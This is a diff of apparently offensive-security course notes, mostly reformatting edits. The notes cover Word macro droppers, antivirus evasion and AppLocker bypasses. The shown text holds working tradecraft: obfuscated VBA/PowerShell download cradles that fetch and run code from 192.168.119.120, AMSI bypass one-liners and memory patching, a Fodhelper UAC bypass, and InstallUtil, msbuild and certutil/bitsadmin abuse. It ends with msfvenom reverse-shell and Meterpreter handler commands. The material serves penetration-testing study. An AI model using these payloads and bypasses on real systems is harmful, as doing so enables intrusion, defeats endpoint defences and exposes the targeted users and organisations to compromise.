 EvilClippy.exe -s fakecode.vba Doc1.doc
@@ -2211,19 +2229,17 @@ End Sub
 
 ### Dechaining with WMI
 
-2 main issues that cause the high detection rate: the use of the **Shell** method and the identifiable PowerShell download cradle.
+2 main issues that cause the high detection rate: The use of the `Shell` method and the identifiable PowerShell download cradle.
 
-When the PowerShell process is created directly from the VBA code through Shell, it becomes a child process of Microsoft Word. => Suspicious
+When the PowerShell process is created directly from the VBA code through `Shell`, it becomes a child process of Microsoft Word. => Suspicious
 
-Use WMI to query, filter, and resolve a host of information on a Windows OS.
+Use `WMI` from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word.
 
-Use WMI from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word.
+`Winmgmt` is the WMI service within the `SVCHOST` process running under the `LocalSystem` account.
 
-Winmgmt is the WMI service within the SVCHOST process running under the LocalSystem account.
+The Winmgmt WMI service is created in a separate process as a child process of `Wmiprvse.exe`, i.e. de-chain the PowerShell process from Microsoft Word.
 
-When performing an action, the Winmgmt WMI service is created in a separate process as a child process of `Wmiprvse.exe`, i.e. de-chain the PowerShell process from Microsoft Word.
-
-PowerShell is running as a 64-bit process => Update the PowerShell shellcode runner script accordingly.
+PowerShell is running as a `64-bit` process.
 
 ```VB
 Sub Document_Open()
@@ -2244,11 +2260,11 @@ End Sub
 
 Perform some obfuscation to hide the content of any text strings from the antivirus scanner.
 
-1. the PowerShell download cradle
-2. the WMI connection string, and
-3. the WMI class name.
+1. The PowerShell download cradle
+2. The WMI connection string, and
+3. The WMI class name.
 
-VBA contains a function called **StrReverse** that, given an input string, returns a string in which the character order is reversed.
+VBA contains a function called `StrReverse` that, given an input string, returns a string in which the character order is reversed.
 
 ```VB
 Sub Document_Open()
@@ -2267,7 +2283,7 @@ Sub MyMacro()
 End Sub
 ```
 
-Reduce the number of times **StrReverse** appears in our code
+Reduce the number of times `StrReverse` appears in our code:
 
 ```VB
 Sub Document_Open()
@@ -2292,7 +2308,7 @@ End Sub
 
 Converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result.
 
-Inside the loop, the byte value of each character is increased by 17. > Use if and else conditions to pad the character's decimal representation to 3 digits.
+Inside the loop, the byte value of each character is increased by `17` > Use `if` and `else` conditions to pad the character's decimal representation to `3` digits.
 
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
@@ -2364,11 +2380,9 @@ End Function
 
 When most AV products emulate the execution of a document, they **rename** it.
 
-=> During execution, check the name of the document and if it is not the same as the one we originally provided
+=> During execution, check the name of the document. 
 
-=> the execution has been emulated
-
-=> exit the code
+=> If it is not the same as the one we originally provided, the execution has been emulated. Exit the code
 
 Generates a Meterpreter reverse shell provided that our file is named `runner.doc`
 
@@ -2395,7 +2409,6 @@ Import-Module ./Invoke-Obfuscation/
 Invoke-Obfuscation
 ```
 
-Invoke-Obfuscation>
 ```
 set scriptpath run0.txt
 TOKEN
@@ -2408,12 +2421,9 @@ Store the output in `run.txt`
 ### Base64 Encode Powershell Command
 
 ```pwsh
-$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run.txt"))'                                                               
-
+$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run.txt"))'                                                        
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    
-
 $EncodedText = [Convert]::ToBase64String($Bytes)                            
-
 $EncodedText
 ```
 
@@ -2540,37 +2550,45 @@ sendEmail -f <email>  -t <email> -u “Report to Review” -m “Please review t
 
 We purposely downloaded and executed the code directly in memory without giving the AV a chance to scan it.
 
-=> Antimalware Scan Interface (AMSI)
-
 AMSI is a set of **APIs** that allow AV products to scan PowerShell commands and scripts when they are executed, even if they are never written to disk.
 
-The unmanaged dynamic link library `AMSI.DLL` is loaded into every PowerShell and PowerShell_ISE process.
+The unmanaged DLL `AMSI.DLL` is loaded into every PowerShell and PowerShell_ISE process.
 
-Relevant information captured by these APIs is forwarded to **Windows Defender** through Remote Procedure Call (RPC).
+Relevant information captured by these APIs is forwarded to `Windows Defender` through Remote Procedure Call (`RPC`).
 
 After Windows Defender analyzes the data, the result is sent back to `AMSI.DLL` inside the PowerShell process.
 
-When PowerShell is launched, it loads `AMSI.DLL` and calls **AmsiInitialize**. AmsiInitialize takes place before we are able to invoke any PowerShell commands, which means we cannot influence it in any way. Once AmsiInitialize is complete and the **amsiContext** context structure is created.
+When PowerShell is launched, it loads `AMSI.DLL` and calls `AmsiInitialize`.
 
-When we execute a PowerShell command, the **AmsiOpenSession** API is called. AmsiOpenSession accepts the amsiContext context structure and creates a session structure to be used in all calls within that session.
+`AmsiInitialize` takes place before we are able to invoke any PowerShell commands => We cannot influence it in any way.
 
-**AmsiScanString** and **AmsiScanBuffer** can both be used to capture the console input or script content either as a string or as a binary buffer respectively.
+Once `AmsiInitialize` is complete and the `amsiContext` context structure is created.
 
-Note that AmsiScanBuffer supersedes AmsiScanString.
+When we execute a PowerShell command, the `AmsiOpenSession` API is called.
 
-Windows Defender scans the buffer passed to AmsiScanBuffer and returns the **AMSI_RESULT** enum. A return value of "32768" indicates the presence of malware, and "1" indicates a clean scan.
+`AmsiOpenSession` accepts the `amsiContext` context structure and creates a session structure to be used in all calls within that session.
 
-Once the scan is complete, calling **AmsiCloseSession** will close the current AMSI scanning session.
+`AmsiScanString` and `AmsiScanBuffer` can both be used to capture the console input or script content either as a string or as a binary buffer respectively.
 
-If the context structure has been corrupted, i.e. the first 4 bytes of amsiContext do not match the header values (ASCII representation of "AMSI"), AmsiOpenSession will return an error => effectively shut down AMSI without affecting PowerShell.
+Note that `AmsiScanBuffer` supersedes `AmsiScanString`.
+
+Windows Defender scans the buffer passed to AmsiScanBuffer and returns the `AMSI_RESULT` enum.
+
+A return value of `32768` indicates the presence of malware, and `1` indicates a clean scan.
+
+Once the scan is complete, calling `AmsiCloseSession` will close the current AMSI scanning session.
+
+If the context structure has been corrupted, i.e. the first `4` bytes of `amsiContext` do not match the header values (ASCII representation of `AMSI`), `AmsiOpenSession` will return an error => Effectively shut down AMSI without affecting PowerShell.
 
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
 
-Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through the amsiInitFailed field. The **amsiInitFailed** field is verified by **AmsiOpenSession** in the same manner as the amsiContext header, which leads to an error.
+Manipulating a result variable set by `AmsiInitialize` can also lead to another AMSI bypass through the `amsiInitFailed` field.
 
-Note: The AMSI bypass still works, but the substrings 'AmsiUtils' and 'amsiInitFailed' have since been flagged as malicious.
+The `amsiInitFailed` field is verified by `AmsiOpenSession` in the same manner as the `amsiContext` header, which leads to an error.
+
+Note: The AMSI bypass still works, but the substrings `AmsiUtils` and `amsiInitFailed` have since been flagged as malicious.
 
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
@@ -2580,23 +2598,27 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 Modify the assembly instructions themselves instead of the data they are acting upon in a technique known as **binary patching**.
 
-The 2 first instructions in **AmsiOpenSession** are a **TEST** followed by a conditional jump. This specific conditional jump is called jump if equal (JE) and depends on a CPU flag called the zero flag (ZF).
+The 2 first instructions in `AmsiOpenSession` are a `TEST` followed by a conditional jump.
+
+This specific conditional jump is called jump if equal (`JE`) and depends on a CPU flag called the zero flag (`ZF`).
 
 => Overwrite the `TEST RDX,RDX` with an `XOR RAX,RAX` instruction, forcing the execution flow to the error branch, which will disable AMSI.
 
-The replacement has to use up the same amount of memory. (3 bytes)
+The replacement has to use up the same amount of memory. (`3` bytes)
 
-To resolve the address of AmsiOpenSession, we would typically call **GetModuleHandle** to obtain the base address of `AMSI.DLL`, then call **GetProcAddress**.
+To resolve the address of `AmsiOpenSession`, typically call `GetModuleHandle` to obtain the base address of `AMSI.DLL`, then call `GetProcAddress`.
 
-In Windows, all memory is divided into 0x1000-byte pages. A memory protection setting is applied to each page, describing the permissions of data on that page.
+In Windows, all memory is divided into `0x1000`-byte pages.
 
-Normally, code pages are set to **PAGE_EXECUTE_READ**, or 0x20, i.e., we can read and execute this code, but not write to it.
+A memory protection setting is applied to each page, describing the permissions of data on that page.
 
-Since we want to overwrite three bytes on this page, we must first change the memory protection. => Win32 **VirtualProtect** API.
+Normally, code pages are set to `PAGE_EXECUTE_READ`, or `0x20`, i.e., we can read and execute this code, but not write to it.
 
-The 3rd argument (flNewProtect) dictates the memory protection we want to apply to the page. Set this to **PAGE_EXECUTE_READWRITE** (0x40).
+Since we want to overwrite 3 bytes on this page, first change the memory protection. => Win32 `VirtualProtect` API.
 
-To conserve memory, Windows shares `AMSI.DLL` between processes that use it. The new memory protection is set to **PAGE_EXECUTE_WRITECOPY** which is equivalent to PAGE_EXECUTE_READWRITE but it is a private copy used only in the current process.
+The 3rd argument (`flNewProtect`) dictates the memory protection we want to apply to the page. Set this to `PAGE_EXECUTE_READWRITE` (`0x40`).
+
+The new memory protection is set to `PAGE_EXECUTE_WRITECOPY` which is equivalent to `PAGE_EXECUTE_READWRITE` but it is a private copy used only in the current process.
 
 ```pwsh
 function LookupFunc {
@@ -2654,13 +2676,13 @@ The Fodhelper binary runs as high integrity, and is vulnerable to exploitation d
 
 Fodhelper tries to locate the following registry key, which does not exist by default in Windows 10: `HKCU:\Software\Classes\ms-settings\shell\open\command`
 
-If we create the registry key and add the **DelegateExecute** value, Fodhelper will search for the default value (Default) and use the content of the value to create a new process.
+If we create the registry key and add the `DelegateExecute` value, Fodhelper will search for the default value (`Default`) and use the content of the value to create a new process.
 
 ### Metasploit UAC bypass module (Not working)
 
-AMSI stops the default Metasploit fodhelper module from bypassing UAC and even kills the existing Meterpreter session.
+AMSI stops the default Metasploit `fodhelper` module from bypassing UAC and even kills the existing Meterpreter session.
 
-target 1 == Windows x64
+target `1` is equivalent to Windows x64.
 
 ```
 use exploit/windows/local/bypassuac_fodhelper
@@ -2680,7 +2702,7 @@ Meterpreter payload has been flagged after the 2nd stage payload has been sent.
 
 => Windows Defender monitored the network interface and subsequently detected the unencrypted and unencoded second stage.
 
-=> Avoid this by enabling the advanced **EnableStageEncoding** option along with **StageEncoder** in Metasploit.
+=> Avoid this by enabling the advanced `EnableStageEncoding` option along with `StageEncoder` in Metasploit.
 
 ```bash
 msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
@@ -2761,19 +2783,21 @@ Jscript handles each command in a single session while PowerShell processes each
 
 ### Registry Key
 
-Jscript tries to query the "AmsiEnable" registry key before initializing AMSI (`HKCU\SOFTWARE\Microsoft\Windows Script\Settings\AmsiEnable`). If this key is set to "0", AMSI is not enabled for the Jscript process.
+Jscript tries to query the `AmsiEnable` registry key before initializing AMSI (`HKCU\SOFTWARE\Microsoft\Windows Script\Settings\AmsiEnable`).
 
-This query is performed in the **JAmsi::JAmsiIsEnabledByRegistry** function inside `Jscript.dll`, which is only called when `wscript.exe` is started.
+If this key is set to `0`, AMSI is not enabled for the Jscript process.
+
+This query is performed in the `JAmsi::JAmsiIsEnabledByRegistry` function inside `Jscript.dll`, which is only called when `wscript.exe` is started.
 
 The `cscript.exe` executable, which is the command-line equivalent of `wscript.exe`.
 
-Use -e to specify which scripting engine will execute the script.
+Use `-e` to specify which scripting engine will execute the script.
 
-The globally unique identifier (GUID) may be understood as a registry entry under `HKLM\SOFTWARE\Classes\CLSID`.
+The globally unique identifier (`GUID`) may be understood as a registry entry under `HKLM\SOFTWARE\Classes\CLSID`.
 
-In essence, the -e option indicates that the specified script file will be processed by `jscript.dll`.
+The `-e` option indicates that the specified script file will be processed by `jscript.dll`.
 
-Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI.
+Prepend below code to the `DotNetToJscript`-generated shellcode runner to bypass AMSI.
 
 ```js
 var sh = new ActiveXObject('WScript.Shell');
@@ -2791,23 +2815,23 @@ try{
 }
 ```
 
-### Rename wscript.exe to amsi.dll and executing it
+### Rename `wscript.exe` to `amsi.dll` and executing it
 
 AMSI requires `AMSI.DLL`.
 
-If a process named "`amsi.dll`" tries to load a DLL of the same name, **LoadLibraryExW** will report that it's already in memory and abort the load.
+If a process named "`amsi.dll`" tries to load a DLL of the same name, `LoadLibraryExW` will report that it's already in memory and abort the load.
 
 => Rename `wscript.exe` to `amsi.dll` and executing it.
 
 Any subsequent attempts to use the AMSI APIs will fail, causing AMSI itself to fail and be disabled, leaving us with an AMSI bypass.
 
-Note that double-clicking or running a file with a `.dll` extension will fail since DLLs are normally loaded, not executed. This behavior is  caused by the Win32 **ShellExecute** API, which is used by `cmd.exe`.
+Note that double-clicking or running a file with a `.dll` extension will fail since DLLs are normally loaded, not executed. This behavior is  caused by the Win32 `ShellExecute` API, which is used by `cmd.exe`.
 
-However, if we instead use the **CreateProcess** Win32 API, the file extension is ignored and the file header would be parsed to determine if it is a valid executable. We can use the **Exec** method of the **WScript.Shell** object since it's just a wrapper for it.
+However, if we instead use the `CreateProcess` Win32 API, the file extension is ignored and the file header would be parsed to determine if it is a valid executable. We can use the `Exec` method of the `WScript.Shell` object since it's just a wrapper for it.
 
 When the Jscript is executed, it will copy `wscript.exe` to a writable and executable folder, naming it "`amsi.dll`". Then, it will execute this copy while supplying the original Jscript file.
 
-Prepend below code to the DotNetToJscript-generated shellcode runner
+Prepend below code to the `DotNetToJscript`-generated shellcode runner
 
 ```js
 var filesys= new ActiveXObject("Scripting.FileSystemObject");
@@ -2839,18 +2863,21 @@ catch(e)
 
 4 rule properties which enable enforcement for 4 separate file types.
 
-1. Wxecutables: `.exe` file extension
+1. Executables: `.exe` file extension
+
 2. Windows Installer files: "`.msi`" file extension.
+
 3. PowerShell scripts, Jscript scripts, VB scripts and older file formats: `.cmd` and `.bat` file extensions. Does not include any 3rd-party scripting engines like Python nor compiled languages like Java.
-4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps)  include applications that can be installed from the Microsoft App store.
+
+4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps) include applications that can be installed from the Microsoft App store.
 
 Default rules:
 
-* Block all applications except those explicitly allowed.
+- Block all applications except those explicitly allowed.
 
-* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic OS functionality but prevents non-administrative users from writing in these folders due to default access rights.
+- Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic OS functionality but prevents non-administrative users from writing in these folders due to default access rights.
 
-* Allows members of the administrative group to run any executables they desire.
+- Allows members of the administrative group to run any executables they desire.
 
 ## Basic Bypasses
 
@@ -2917,7 +2944,7 @@ TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both 
 type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 ```
 
-Verify that the Jscript code was written to the alternate data stream
+Verify that the Jscript code was written to the alternate data stream:
 
 ```bat
 dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
@@ -2945,7 +2972,9 @@ $ExecutionContext.SessionState.LanguageMode
 
 Allow arbitrary PowerShell execution
 
-`Bypass.exe`
+```bat
+C:\Windows\Tasks\Bypass.exe
+```
 
 ```csharp
 using System;
@@ -2973,27 +3002,25 @@ namespace Bypass
 }
 ```
 
-```bat
-C:\Windows\Tasks\Bypass.exe
-
-type C:\Tools\test.txt
-```
-
 ### PowerShell CLM Bypass
 
-Command-line utility **InstallUtil** allows us to install and uninstall server resources by executing the installer components in a specified assembly.
+Command-line utility `InstallUtil` allows us to install and uninstall server resources by executing the installer components in a specified assembly.
 
-=> Abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.
+=> Abuse it to execute arbitrary C# code by putting the code inside either the `install` or `uninstall` methods of the `installer` class.
 
-Only use the **uninstall** method since the install method requires administrative privileges to execute.
+Only use the `uninstall` method since the `install` method requires **administrative privileges** to execute.
 
 The `System.Configuration.Install` namespace is missing an assembly reference in Visual Studio.
 
-=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
+=> Add this by right-clicking on `References` in the `Solution Explorer` and choosing `Add References....` > `Assemblies` menu on the left-hand side and scroll down to `System.Configuration.Install`.
 
-AppLocker DLL rules are enabled to block untrusted DLLs
+AppLocker DLL rules are enabled to block untrusted DLLs.
 
-=> Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
+=> Leverage `InstallUtil` to bypass AppLocker and revive the reflective DLL injection technique.
+
+```bat
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+```
 
 ```csharp
 using System;
@@ -3034,19 +3061,15 @@ namespace Bypass
 }
 ```
 
-```bat
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
-```
+It is possible to reuse this with the Microsoft Word macros since they are not limited by AppLocker.
 
-It would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker.
+- Instead of using `WMI` to directly start a PowerShell process and download the shellcode runner from our web server, make WMI execute `InstallUtil`.
 
-Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.
-
-The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**.
+The issue is that the compiled C# file has to be **on disk** when `InstallUtil` is invoked.
 
 To attempt to bypass anitvirus, obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
 
-Use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.
+Use the native `certutil` tool to perform the encoding and decoding and `bitsadmin` for the downloading.
 
 ```bat
 certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
@@ -3100,7 +3123,7 @@ $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.Fil
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 
-Downside: Must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
+Downside: We must provide both the `XML` file and the `C#` code file **on disk**, and the C# code file will be compiled temporarily to disk as well.
 
 ### MSbuild
 
@@ -3159,7 +3182,7 @@ Executes the code in a project file using `msbuild.exe`.
 </Project>
 ```
 
-The C# project file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+The C# project file above will simply print `Hello From a Code Fragment` and `Hello From a Class.` to the screen.
 
 ```bat
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
@@ -3169,7 +3192,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
 
 HTML Applications include embedded Jscript or VBS code that is parsed and executed by `mshta.exe`.
 
-Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.
+Since `mshta.exe` is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.
 
 ### JScript and MSHTA
 
@@ -3240,7 +3263,7 @@ sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"
 
 Register a new domain: It may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.
 
-Domains in this category are often **less than 1 week old** and are relatively unused, lacking inquiries and traffic.
+Domains in this category are often **< 1 week old** and are relatively unused, lacking inquiries and traffic.
 
 => Collect domain names in advance and generate lookups and traffic well in advance of an engagement.
 
@@ -9936,3 +9959,21 @@ We are now a part of the `BUILTIN\Administrators` on WEB01 because of the la_web
 Note that refreshing TGTs may not always be a simple task unless we have access to clear text passwords or we can use NTLM authentication with pass-the-hash techniques.
 
 JIT often yields access to high-privileged groups, which can result in privilege escalation and lateral movement in the domain due to group membership on additional machines.
+
+```bash
+nc -nvlp 444
+```
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
+```
+
+## Meterpreter
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
+```
+
+```
+set AutoRunScript post/windows/manage/migrate
+```
